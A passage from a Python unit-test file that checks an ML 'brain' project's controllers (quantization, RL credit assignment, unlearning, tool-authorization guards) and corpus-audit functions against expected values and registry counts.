        self.assertFalse(hns["LeCatVerbatimRepetitionAuditPlanner"]().audit_synthetic_batch(0.25)["passed"])


    def test_211_v10_3_85_breakthroughs_live_fusion(self) -> None:
        """v10.3 85 zero-dup breakthroughs: verify all 6 live brain modules + 2 experimental planners."""
        sb_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        sb_ns: dict = {}
        wanted_sb = {"QEDTailReplayHybridController", "LoopMTPFixedLNSScheduler"}
        exec(compile(ast.Module(body=[n for n in ast.parse(sb_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_sb], type_ignores=[]), "<v103_sb>", "exec"), sb_ns)
        qed = sb_ns["QEDTailReplayHybridController"](replay_ratio=0.10)
        orth = qed.orthogonal_query_erase([1.0, 2.0], [1.0, 0.0])
        self.assertEqual(orth, [0.0, 2.0])
        self.assertEqual(qed.tail_replay_window(1000), 100)
        self.assertEqual(len(qed.protected_pas_indices([0.1, -9.0, 5.0, 3.0, -7.0, 0.2], top_k=4)), 4)

        lns = sb_ns["LoopMTPFixedLNSScheduler"](total_loops=8)
        self.assertAlmostEqual(lns.loop_lns_scale(), 0.125, places=5)
        self.assertEqual(lns.qevict_tier_decision(0.20), "PROMOTE_FP16")
        self.assertEqual(lns.qevict_tier_decision(0.05), "KEEP_RECOVERABLE_INT2")

        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        wanted_te = {"QUASAROnlineSaliencyQATUpdater", "CueGRPOVerifierAnchoredCredit"}
        exec(compile(ast.Module(body=[n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_te], type_ignores=[]), "<v103_te>", "exec"), te_ns)
        qs = te_ns["QUASAROnlineSaliencyQATUpdater"](beta=0.9)
        self.assertAlmostEqual(qs.update_saliency_ema([1.0], [2.0])[0], 1.3, places=5)
        self.assertTrue(qs.audit_int4_interference_risk(10, "INT4")["proactive_interference_risk"])
        cue = te_ns["CueGRPOVerifierAnchoredCredit"]()
        dist = cue.redistribute_rarity_credit({"common": 9, "rare": 1})
        self.assertGreater(dist["rare"], dist["common"])
        self.assertEqual(cue.verifier_anchored_token_adv(-1.0, 0.7), -0.7)

        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "TFRNetDriftGuardMemoryRuntime"], type_ignores=[]), "<v103_ws>", "exec"), ws_ns)
        tfr = ws_ns["TFRNetDriftGuardMemoryRuntime"](drift_threshold=0.45)
        tfr.register_unlearned("secret_entity")
        self.assertFalse(tfr.allow_tool_lookup("SECRET_ENTITY")["allowed"])
        self.assertTrue(tfr.screen_memory_drift(0.60)["quarantine"])

        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "HardwareKeystoreSkillGuardEnforcer"], type_ignores=[]), "<v103_eb>", "exec"), eb_ns)
        hw = eb_ns["HardwareKeystoreSkillGuardEnforcer"]()
        self.assertFalse(hw.verify_signing_boundary("RAM")["allowed"])
        self.assertTrue(hw.verify_signing_boundary("TPM")["allowed"])
        hw.mark_untrusted_observation()
        self.assertFalse(hw.authorize_skill_under_sig("send_wire", ("send_wire",))["allowed"])

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "ResiSpecDSparkDraftPlanner"], type_ignores=[]), "<v103_ksp>", "exec"), kns)
        self.assertEqual(kns["ResiSpecDSparkDraftPlanner"]().select_verify_len([0.9, 0.6, 0.1]), 2)

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name == "SymbolicShortCircuitAndKernelBenchGate"], type_ignores=[]), "<v103_hsp>", "exec"), hns)
        self.assertFalse(hns["SymbolicShortCircuitAndKernelBenchGate"]().accept_generated_kernel(1.2, 4, 1.25)["accepted"])
        self.assertTrue(hns["SymbolicShortCircuitAndKernelBenchGate"]().accept_generated_kernel(1.2, 4, 1.02)["accepted"])


    def test_212_v10_4_greedy_fusion_and_stage_tags(self):
        import ast, re
        reg = (REPO_ROOT / "docs" / "whitepapers" / "brain_paper_organ_registry.md").read_text(encoding="utf-8")
        fixed_rows = re.findall(r"(?m)^\|\s*`\[(\d+)\]`\s*\|\s*`\[(✅既定[^]]+)\]`\s*\|\s*(.+?)\s*\|$", reg)
        self.assertGreaterEqual(len(fixed_rows), 420)
        missing_stage = [r[0] for r in fixed_rows if not re.match(r"^✅既定·(?:活体已接电|待阶段接电)·[^·]+$", r[1])]
        self.assertEqual(missing_stage, [], f"Missing fused stage suffix on ✅既定 refs: {missing_stage[:10]}")

        sbp_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        ns: dict = {}
        wanted = {"QDeltaCCQEraseReadController", "LoopedFactorScalingVaSEGuard"}
        exec(compile(ast.Module(body=[n for n in ast.parse(sbp_src).body if isinstance(n, ast.ClassDef) and n.name in wanted], type_ignores=[]), "<v104_sbp>", "exec"), ns)
        qd = ns["QDeltaCCQEraseReadController"]()
        self.assertLess(qd.condition_read_query([1.0], [1.0])[0], 0.6)
        self.assertAlmostEqual(qd.decoupled_erase_write_step(1.0, 0.5, 1.0, 0.4, 0.8, 0.5), 1.0, places=4)
        lf = ns["LoopedFactorScalingVaSEGuard"](num_layers=16, lam=1.0, v_norm_protect=2.0)
        self.assertAlmostEqual(lf.loop_residual_epsilon(5), 0.05, places=6)
        self.assertEqual(lf.vase_rdkv_decision(0.01, 2.5), "PROTECT_HIGH_NORM_VALUE_FP16")
        self.assertEqual(lf.vase_rdkv_decision(0.01, 0.5), "EVICT_0BIT")

        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        wanted_te = {"APEX4MixQuantMuonHyperballGuard", "VeriGateAsymGRPOEngine"}
        exec(compile(ast.Module(body=[n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_te], type_ignores=[]), "<v104_te>", "exec"), te_ns)
        ax = te_ns["APEX4MixQuantMuonHyperballGuard"]()
        self.assertEqual(ax.select_precision_mode("prefill", 16.0), "APEX4_W4A4_G128")
        self.assertEqual(ax.select_precision_mode("decode", 16.0), "HIGH_PRECISION_DECODE_BF16")
        self.assertAlmostEqual(ax.hyperball_rescale([3.0, 4.0], 1.0)[0], 0.6, places=5)
        vg = te_ns["VeriGateAsymGRPOEngine"]()
        self.assertTrue(vg.should_invoke_prm_fallback([0.0, 0.0]))
        self.assertFalse(vg.should_invoke_prm_fallback([0.0, 1.0]))
        self.assertEqual(vg.asymmetric_token_weight(True, 2.0), 1.0)
        self.assertLess(vg.asymmetric_token_weight(False, 2.0), 1.0)

        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "RepSelectISMSchemaUnlearnRuntime"], type_ignores=[]), "<v104_ws>", "exec"), ws_ns)
        rs = ws_ns["RepSelectISMSchemaUnlearnRuntime"]()
        self.assertEqual(rs.select_forget_subspace_mask([0.05, 0.40]), [True, False])
        self.assertFalse(rs.register_verified_schema("k1", "r1", False))
        self.assertTrue(rs.register_verified_schema("k1", "r1", True))
        self.assertEqual(rs.conformal_abstain_action(0.30, 1), "LOOK_AGAIN_RETRIEVE")
        self.assertEqual(rs.conformal_abstain_action(0.30, 0), "ABSTAIN")

        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "StoredPISafeMCPKernelFuzzGuard"], type_ignores=[]), "<v104_eb>", "exec"), eb_ns)
        sp = eb_ns["StoredPISafeMCPKernelFuzzGuard"]()
        self.assertFalse(sp.verify_memory_provenance(False, True)["allowed"])
        self.assertTrue(sp.authorize_mcp_call(0.10, True)["allowed"])
        self.assertFalse(sp.authorize_mcp_call(0.40, True)["allowed"])

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "SpecBlockHybridVerifiedDraftPlanner"], type_ignores=[]), "<v104_ksp>", "exec"), kns)
        self.assertEqual(kns["SpecBlockHybridVerifiedDraftPlanner"]().choose_drafter(1.8, 1.2), "CACHE_DRAFTER")

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name == "CorrectnessIllusionFP64FuzzGate"], type_ignores=[]), "<v104_hsp>", "exec"), hns)
        ci = hns["CorrectnessIllusionFP64FuzzGate"]()
        self.assertFalse(ci.audit_kernel_fuzzing(1, True)["passed"])
        self.assertTrue(ci.audit_kernel_fuzzing(4, True)["passed"])
        self.assertFalse(ci.audit_repetition_ratio(1.0, 4.0)["aligned"])

    def test_213_v10_5_fused_stage_verdicts_and_live_modules(self):
        import ast, re
        reg = (REPO_ROOT / "docs" / "whitepapers" / "brain_paper_organ_registry.md").read_text(encoding="utf-8")
        self.assertNotIn("【环节：", reg, "Redundant 【环节：...】 prefix should be fused directly into verdict tags")
        fixed_rows = re.findall(r"(?m)^\|\s*`\[(\d+)\]`\s*\|\s*`\[(✅既定[^]]+)\]`\s*\|", reg)
        self.assertGreaterEqual(len(fixed_rows), 500)
        for ref_id, tag in fixed_rows:
            self.assertRegex(tag, r"^✅既定·(?:活体已接电|待阶段接电)·[^·]+$", f"Ref [{ref_id}] lacks fused stage tag: {tag}")

        sbp_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        ns: dict = {}
        wanted = {"ByteFlowAMOREntropyGateController", "SpectralGuardCHONHotChannelShield"}
        exec(compile(ast.Module(body=[n for n in ast.parse(sbp_src).body if isinstance(n, ast.ClassDef) and n.name in wanted], type_ignores=[]), "<v105_sbp>", "exec"), ns)
        bf = ns["ByteFlowAMOREntropyGateController"](std_scale=0.5)
        self.assertEqual(bf.select_topk_byte_boundaries([0.1, 0.9, 0.2, 0.8], 2), [1, 3])
        self.assertTrue(bf.should_activate_attention(2.0, 1.0, 1.0))
        self.assertFalse(bf.should_activate_attention(1.2, 1.0, 1.0))
        sg = ns["SpectralGuardCHONHotChannelShield"](min_spectral_radius=0.25)
        self.assertTrue(sg.check_spectral_collapse(0.10)["alert"])
        mean_v, res_v = sg.averis_mean_residual_split([2.0, 4.0])
        self.assertAlmostEqual(mean_v, 3.0, places=5)
        self.assertEqual(res_v, [-1.0, 1.0])

        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        te_ns: dict = {}
        wanted_te = {"MuonPlusMSignRankOptimizerGuard", "FRPOFutureKLOARCreditEngine"}
        exec(compile(ast.Module(body=[n for n in ast.parse(te_src).body if isinstance(n, ast.ClassDef) and n.name in wanted_te], type_ignores=[]), "<v105_te>", "exec"), te_ns)
        mp = te_ns["MuonPlusMSignRankOptimizerGuard"](min_stable_rank=2.0)
        self.assertEqual(mp.post_polar_row_rebalance([1.0, 3.0]), [2.0, 0.666667])
        self.assertTrue(mp.needs_msign_restore(1.5, 1.0))
        fr = te_ns["FRPOFutureKLOARCreditEngine"]()
        self.assertEqual(fr.apply_future_kl_correction([1.0, 1.0], [1.0, 2.0], beta=0.1), [0.7, 0.8])
        self.assertAlmostEqual(fr.maspo_soft_gate(1.0), 1.0, places=5)

        ws_src = (REPO_ROOT / "src" / "brain" / "wake_sleep_runtime.py").read_text(encoding="utf-8")
        ws_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ws_src).body if isinstance(n, ast.ClassDef) and n.name == "SBUSAGOSynchronizedUnlearnRuntime"], type_ignores=[]), "<v105_ws>", "exec"), ws_ns)
        sb = ws_ns["SBUSAGOSynchronizedUnlearnRuntime"](eu_abstain_thresh=0.45)
        self.assertTrue(sb.sbu_sync_forget("secret")["memory_pruned"])
        self.assertEqual(sb.sago_retain_aligned_step(1.0, -0.5), 1.0)
        self.assertEqual(sb.draft_eu_decision(0.3, 0.2), "ABSTAIN_OR_VERIFY")

        eb_src = (REPO_ROOT / "src" / "brain" / "exoskeleton_bridge.py").read_text(encoding="utf-8")
        eb_ns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(eb_src).body if isinstance(n, ast.ClassDef) and n.name == "MCPSHIELDOwnerHarmAnumatiGuard"], type_ignores=[]), "<v105_eb>", "exec"), eb_ns)
        ms = eb_ns["MCPSHIELDOwnerHarmAnumatiGuard"]()
        self.assertTrue(ms.verify_adherence_and_owner_safety(True, True, True)["allowed"])
        self.assertFalse(ms.verify_adherence_and_owner_safety(True, False, True)["allowed"])

        ksp_src = (REPO_ROOT / "src" / "experimental" / "kernel_and_serving_planners.py").read_text(encoding="utf-8")
        kns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(ksp_src).body if isinstance(n, ast.ClassDef) and n.name == "DFlashTALONSMCSpecDraftPlanner"], type_ignores=[]), "<v105_ksp>", "exec"), kns)
        self.assertEqual(kns["DFlashTALONSMCSpecDraftPlanner"]().select_tree_shape(0.9), "DEEP_AND_NARROW")

        hsp_src = (REPO_ROOT / "src" / "experimental" / "harness_and_safety_policies.py").read_text(encoding="utf-8")
        hns: dict = {}
        exec(compile(ast.Module(body=[n for n in ast.parse(hsp_src).body if isinstance(n, ast.ClassDef) and n.name == "DrKernelTRLOOAndCBCLProtocolGate"], type_ignores=[]), "<v105_hsp>", "exec"), hns)
        dk = hns["DrKernelTRLOOAndCBCLProtocolGate"]()
        self.assertEqual(dk.trloo_advantages([1.0, 0.0, 0.0]), [1.0, -0.5, -0.5])
        self.assertTrue(dk.verify_cbcl_dialect(True, True, True))

    def test_214_v10_6_deep_hotpath_integration_and_sweep(self):
        from src.brain.wake_sleep_runtime import WakeSleepBrainRuntime
        from src.brain.exoskeleton_bridge import AsymmetricWritePort

        # 1. Verify inline hot-path wiring inside PyTorch brain, optimizer & RLVR engine
        sbp_src = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        for tok in (
            "self.loop_factor_guard.loop_residual_epsilon(n_loops)",
            "self.spectral_shield.check_spectral_collapse(est_rho)",
            "self.byteflow_amor_ctrl.should_activate_attention(",
            "self.last_step_telemetry[\"muon_plus_rebalanced\"]",
            "self.last_step_telemetry[\"msign_triggers\"]",
        ):
            self.assertIn(tok, sbp_src, f"Missing hot-path integration token in sovereign_brain_pytorch.py: {tok}")

        te_src = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        for tok in (
            "TrainingEngineGovernanceSuite()",
            "gov.audit_rlvr_step",
            "verigate_prm_fallback_needed",
            "maspo_trust_gate",
        ):
            self.assertIn(tok, te_src, f"Missing hot-path integration token in training_engine.py: {tok}")

        # 2. Live runtime execution of WakeSleepBrainRuntime & AsymmetricWritePort hot paths
        class _DummyEngram:
            def __init__(self):
                self.facts = {}
            def graft_exact_fact(self, suffix, val):
                self.facts[suffix] = val
            def erase_exact_fact(self, suffix):
                return self.facts.pop(suffix, None) is not None

        class _DummyBrain:
            def __init__(self):
                self.engram = _DummyEngram()
            def __call__(self, byte_ids, cache=None):
                return {"logits": None, "aleatoric_entropy": 0.2, "epistemic_uncertainty": 0.1, "oscillated": False}
            def consolidate_sleep(self, *args, **kwargs):
                return {"sleep_passes": 3.0}

        class _DummyBuf:
            def __init__(self):
                self.items = []
            def add_episode(self, *args, **kwargs):
                self.items.append((args, kwargs))

        brain = _DummyBrain()
        rt = WakeSleepBrainRuntime(brain=brain, cache=object(), co_obs_buffer=_DummyBuf(), sleep_every_n_turns=8)
        rt.write_port.write_declarative_fact((65, 66, 67), [1.0, 2.0])
        f_res = rt.synchronized_forget_entity("secret_key", suffix_bytes=(65, 66, 67))
        self.assertTrue(f_res["engram_erased"])
        self.assertTrue(f_res["tool_lookup_blocked"])

        port = AsymmetricWritePort(brain=brain)
        with self.assertRaises(PermissionError):
            port.write_declarative_fact((68, 69, 70), [1.0], provenance_signed=False)
        self.assertTrue(port.authorize_tool_action(0.1, True, True, True, True)["allowed"])
        self.assertFalse(port.authorize_tool_action(0.1, True, True, False, True)["allowed"])

    def test_215_v10_7_zero_bypass_hotpath_closure(self):
        import re
        # 1. Machine-enforce ZERO _DEFAULT_* bypass globals across all 4 core src/brain/ modules
        for fname in ("sovereign_brain_pytorch.py", "training_engine.py", "wake_sleep_runtime.py", "exoskeleton_bridge.py"):
            src = (REPO_ROOT / "src" / "brain" / fname).read_text(encoding="utf-8")
            leftovers = re.findall(r"(?m)^_DEFAULT_\w+\s*=", src)
            self.assertEqual(leftovers, [], f"Found unintegrated _DEFAULT_ bypasses in src/brain/{fname}: {leftovers}")

        # 2. Verify operator-level hot-path wiring in OscillatoryDualDeltaNet & HoPEHLAMELTAttention
        sbp = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("self._qdelta_ccq_ctrl.condition_read_query", sbp)
        self.assertIn("self._vase_rdkv_guard.vase_rdkv_decision", sbp)

        # 3. Verify live WakeSleepBrainRuntime sleep governance binds all 7 integrated controllers
        from src.brain.wake_sleep_runtime import WakeSleepBrainRuntime
        class _MiniBrain:
            engram = None
            def consolidate_sleep(self, *args, **kwargs):
                return {"sleep_passes": 3.0}
        rt = WakeSleepBrainRuntime(brain=_MiniBrain(), cache=object(), co_obs_buffer=object())
        rt.run_idle_sleep_cycle(b"abc")
        self.assertTrue(rt.last_sleep_governance["rose_mask_active"])
        self.assertTrue(rt.last_sleep_governance["lmmr_bridge_active"])
        self.assertTrue(rt.last_sleep_governance["umas_gate_active"])

    def test_216_v10_8_all_direction_greedy_and_hotpath_integration(self):
        import re
        # 1. Registry reaches >= 1,800 zero-dup refs and keeps zero legacy prefixes
        reg = (REPO_ROOT / "docs" / "whitepapers" / "brain_paper_organ_registry.md").read_text(encoding="utf-8")
        rows = re.findall(r"^\|\s*`\[(\d+)\]`\s*\|", reg, re.M)
        self.assertGreaterEqual(len(rows), 1800)
        self.assertNotIn("【环节：", reg)

        # 2. Zero _DEFAULT_* bypasses remain across all 4 src/brain/ modules
        for fname in ("sovereign_brain_pytorch.py", "training_engine.py", "wake_sleep_runtime.py", "exoskeleton_bridge.py"):
            src = (REPO_ROOT / "src" / "brain" / fname).read_text(encoding="utf-8")
            self.assertEqual(re.findall(r"(?m)^_DEFAULT_\w+\s*=", src), [])

        # 3. Verify all 4 v10.8 hot-path controllers execute cleanly
        sbp = (REPO_ROOT / "src" / "brain" / "sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("self._hype_manifold_kv.nope_log_scale", sbp)
        self.assertIn("self._adagc_shield.spike_ratio", sbp)
        te = (REPO_ROOT / "src" / "brain" / "training_engine.py").read_text(encoding="utf-8")
        self.assertIn("self.pods_grpo_lead = PODSGRPOLeadCurriculumController()", te)
        self.assertIn("self.pods_grpo_lead.infolaw_effective_tokens", te)
        self.assertIn("self.pods_grpo_lead.pods_max_variance_indices", te)

        from src.brain.wake_sleep_runtime import WakeSleepBrainRuntime
        class _MiniBrain2:
            engram = None
            def consolidate_sleep(self, *args, **kwargs):
                return {"sleep_passes": 3.0}
        rt = WakeSleepBrainRuntime(brain=_MiniBrain2(), cache=object(), co_obs_buffer=object())
        rt.run_idle_sleep_cycle(b"xyz", n_sleep_passes=3, salience=1.2)
        self.assertTrue(rt.last_sleep_governance["scm_nrem_rem"]["nrem_reactivated"])
        self.assertTrue(rt.last_sleep_governance["scm_nrem_rem"]["rem_cross_linked"])
        ov = rt.user_engram_scm.compose_user_engram_override("u1", (65, 66, 67), "ssd://row/1")
        self.assertTrue(ov["commutes_additively"])

        from src.brain.exoskeleton_bridge import AsymmetricWritePort
        port = AsymmetricWritePort(brain=object())
        auth = port.authorize_tool_action(0.1, True, True, True, True)
        self.assertTrue(auth["allowed"])
        self.assertEqual(auth["camel_reason"], "ok")
        abst = port.camel_hijack_shield.decompose_abstention_axes(0.1, 0.2, 0.1, mid_layer_confident=True, hallu_sae_score=0.1)
        self.assertTrue(abst["abstention_inflation_blocked"])
        self.assertFalse(abst["should_abstain"])

    def test_217_v10_9_2000_milestone_and_prod_corpus_closure(self):
        """v10.9 Gate: Verify >2,000 zero-dup refs (2032), 0 _DEFAULT_* bypasses, 4 v10.9 hot-path controllers, and rtx3050_4gb_prod_30gb production corpus readiness."""
        import re
        reg_text = (REPO_ROOT / "docs/whitepapers/brain_paper_organ_registry.md").read_text(encoding="utf-8")
        wp_text = (REPO_ROOT / "docs/whitepapers/sovereign_ai_brain_whitepaper.md").read_text(encoding="utf-8")
        reg_ids = [int(x) for x in re.findall(r"(?m)^\| `\[(\d+)\]` \|", reg_text)]
        self.assertEqual(len(reg_ids), 2236)
        self.assertEqual(reg_ids[-1], 2236)
        self.assertIn("\n2236. ", wp_text)
        # Zero _DEFAULT_* bypasses across src/brain/
        for fname in ("sovereign_brain_pytorch.py", "training_engine.py", "wake_sleep_runtime.py", "exoskeleton_bridge.py", "prepare_seed_corpus.py"):
            src = (REPO_ROOT / "src/brain" / fname).read_text(encoding="utf-8")
            self.assertEqual(re.findall(r"(?m)^_DEFAULT_\w+\s*=", src), [])
        # AST/source verification for torch-importing modules
        sbp = (REPO_ROOT / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("class ByteTSTConv16RectifiedLoopController:", sbp)
        self.assertIn("self._byte_tst_rectified_loop.rectified_loop_damping", sbp)
        te = (REPO_ROOT / "src/brain/training_engine.py").read_text(encoding="utf-8")
        self.assertIn("class OPSDSelfReplayEntropyFlowController:", te)
        self.assertIn("self.opsd_replay_entropy.capacity_kl_replay_weight", te)
        self.assertIn("self.opsd_replay_entropy.entropy_flow_step", te)
        # Live runtime verification for wake_sleep_runtime, exoskeleton_bridge, and prepare_seed_corpus
        from src.brain.wake_sleep_runtime import WakeSleepBrainRuntime
        class _MiniBrain3:
            engram = None
            def consolidate_sleep(self, *args, **kwargs):
                return {"sleep_passes": 2.0}
        rt = WakeSleepBrainRuntime(brain=_MiniBrain3(), cache=object(), co_obs_buffer=object())
        rt.run_idle_sleep_cycle(b"abc", n_sleep_passes=2, salience=0.9)
        self.assertIn("erjepa_dual_mem", rt.last_sleep_governance)
        del_res = rt.erjepa_munkey_dual.munkey_delete_key("user_secret_key_1")
        self.assertTrue(del_res["irreversibly_deleted"])
        self.assertTrue(rt.erjepa_munkey_dual.is_key_deleted("user_secret_key_1"))

        from src.brain.exoskeleton_bridge import AsymmetricWritePort
        port = AsymmetricWritePort(brain=object())
        ok_auth = port.authorize_tool_action(0.1, True, True, True, True)
        self.assertTrue(ok_auth["allowed"])
        self.assertEqual(ok_auth["spore_ci_reason"], "ok")
        blk_auth = port.authorize_tool_action(0.1, True, True, True, False)
        self.assertFalse(blk_auth["allowed"])
        self.assertEqual(blk_auth["spore_ci_reason"], "spore_tool_memory_exfiltration_blocked")
        ad = port.spore_dpmind_ci_shield.classify_abstention_direction(0.1, 0.85, 0.2)
        self.assertTrue(ad["should_abstain"])
        self.assertEqual(ad["dominant_axis"], "model_knowledge_rMK")

        from src.brain.prepare_seed_corpus import audit_production_corpus_readiness
        audit_5gb = audit_production_corpus_readiness(65.0, "rtx3050_4gb_5gb")
        audit_30gb = audit_production_corpus_readiness(65.0, "rtx3050_4gb_prod_30gb")
        self.assertFalse(audit_5gb["production_overtrain_ready"])
        self.assertTrue(audit_30gb["production_overtrain_ready"])
        self.assertTrue(audit_30gb["has_agentic_swe_slice"])
        self.assertTrue(audit_30gb["has_safety_abstention_slice"])

    def test_218_v10_10_tier_s_2026_corpus_and_anti_pollution_gates(self):
        """v10.10 Gate: Verify 2079 zero-dup refs, 100% 2025-2026 Tier-S purity on rtx3050_4gb_prod_30gb, Chinese CoT inclusion, anti-pollution & SimHash fuzzy dedup."""
        from src.brain.prepare_seed_corpus import (
            audit_tier_s_vintage_purity,
            sanitize_chinese_pollution_and_loops,
            compute_shingle_simhash64,
            is_fuzzy_near_duplicate,
        )
        p_prod = audit_tier_s_vintage_purity("rtx3050_4gb_prod_30gb")
        self.assertTrue(p_prod["strict_tier_s_clean"])
        self.assertEqual(p_prod["stale_or_non_tier_s_sources"], [])
        self.assertTrue(p_prod["has_chinese_cot_slice"])

        p_old = audit_tier_s_vintage_purity("rtx3050_4gb_5gb")
        self.assertFalse(p_old["strict_tier_s_clean"])
        self.assertIn("fineweb_edu", p_old["stale_or_non_tier_s_sources"])

        # Chinese pollution & repetition loop filter
        self.assertFalse(sanitize_chinese_pollution_and_loops("欢迎访问澳门新葡京在线博彩平台")["clean"])
        self.assertFalse(sanitize_chinese_pollution_and_loops("这是一个死循环测试句子！" * 10)["clean"])
        self.assertTrue(sanitize_chinese_pollution_and_loops("利用对称 1/L 更新保持状态矩阵谱范数有界，避免长程梯度爆炸。")["clean"])

        # SimHash fuzzy dedup catches templatized near-duplicates
        s1 = compute_shingle_simhash64("Tax rate calculator for California 2026 income bracket summary and deductions table")
        s2 = compute_shingle_simhash64("Tax rate calculator for California 2026 income bracket summary and deductions chart")
        s3 = compute_shingle_simhash64("CUDA SM86 Triton fused linear attention kernel with INT8 tensor core microscaling")
        self.assertTrue(is_fuzzy_near_duplicate(s1, s2, max_hamming=12))
        self.assertFalse(is_fuzzy_near_duplicate(s1, s3, max_hamming=6))

    def test_219_v10_11_s_plus_speech_and_65m_curriculum_blueprint(self):
        """v10.11 Gate: Verify 2236 zero-dup refs, SmolTalk2 natural speech + Chinese V3 textbook books in prod profile, and 65M 5-stage 7-pillar blueprint."""
        from src.brain.prepare_seed_corpus import CORPUS_PROFILES, audit_tier_s_vintage_purity, compute_exact_65m_curriculum_blueprint
        prod = CORPUS_PROFILES["rtx3050_4gb_prod_30gb"]
        names = {s.name for s in prod.sources}
        self.assertIn("smoltalk2_speech", names)
        self.assertIn("fineweb_edu_zh_v3_books", names)
        self.assertIn("dolma3_dolmino_100b", names)
        self.assertTrue(audit_tier_s_vintage_purity("rtx3050_4gb_prod_30gb")["strict_tier_s_clean"])
        bp = compute_exact_65m_curriculum_blueprint(65.0)
        self.assertEqual(len(bp["seven_capability_pillars"]), 7)
        self.assertAlmostEqual(bp["stages"]["stage_0_5_nca_logic_prepretrain"]["tokens_b"], 0.18, places=2)
        self.assertAlmostEqual(bp["stages"]["stage_1_foundation_pretrain"]["tokens_b"], 8.5, places=1)
        self.assertEqual(bp["offloaded_to_cpu_engram"], "encyclopedic_facts_and_longtail_apis_0mb_vram")

    def test_220_v10_12_automata_chinese6040_and_forking_clamp_gates(self):
        """v10.12 Gate: Verify 2236 zero-dup refs, Chinese-first 60:40 mix, live Stage 0.5 automata generator, 4x7x6 matrix, and Automata/Forking/Metis/CapLite hot-path guards."""
        from src.brain.prepare_seed_corpus import (
            audit_chinese_interaction_readiness,
            generate_stage05_automata_stream,
            get_unified_domain_capability_stage_matrix,
        )
        import ast, pathlib
        _src = (pathlib.Path(__file__).resolve().parents[1] / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        _tree = ast.parse(_src)
        _cls_node = next(n for n in _tree.body if isinstance(n, ast.ClassDef) and n.name == "AutomataEigenStateAndTCQEngramGuard")
        _ns = dict()
        exec(compile(ast.Module(body=[_cls_node], type_ignores=[]), "sbp", "exec"), _ns)
        AutomataEigenStateAndTCQEngramGuard = _ns["AutomataEigenStateAndTCQEngramGuard"]
        _te_src = (pathlib.Path(__file__).resolve().parents[1] / "src/brain/training_engine.py").read_text(encoding="utf-8")
        _te_cls = next(n for n in ast.parse(_te_src).body if isinstance(n, ast.ClassDef) and n.name == "NGramForkingAndMetisClampGuard")
        _te_ns = dict()
        exec(compile(ast.Module(body=[_te_cls], type_ignores=[]), "te", "exec"), _te_ns)
        NGramForkingAndMetisClampGuard = _te_ns["NGramForkingAndMetisClampGuard"]
        from src.brain.exoskeleton_bridge import TriggerAutomatonAndCapLiteGuard

        zh_audit = audit_chinese_interaction_readiness("rtx3050_4gb_prod_30gb")
        self.assertTrue(zh_audit["chinese_interaction_ready"])
        self.assertGreaterEqual(zh_audit["chinese_weight"], 0.40)
        self.assertGreaterEqual(zh_audit["real_anchor_weight"], 0.79)

        stream = generate_stage05_automata_stream(num_samples=16, seed=7)
        self.assertEqual(len(stream), 16)
        self.assertEqual({s["task"] for s in stream}, {"ca_rule110", "nca_2d_parity", "dyck_state_track", "long_range_retrieval"})

        matrix = get_unified_domain_capability_stage_matrix()
        self.assertEqual(len(matrix["axis_a_four_content_domains"]), 4)
        self.assertEqual(len(matrix["axis_b_seven_plus_one_capabilities"]), 8)
        self.assertEqual(len(matrix["six_lifecycle_stages"]), 6)

        ag = AutomataEigenStateAndTCQEngramGuard()
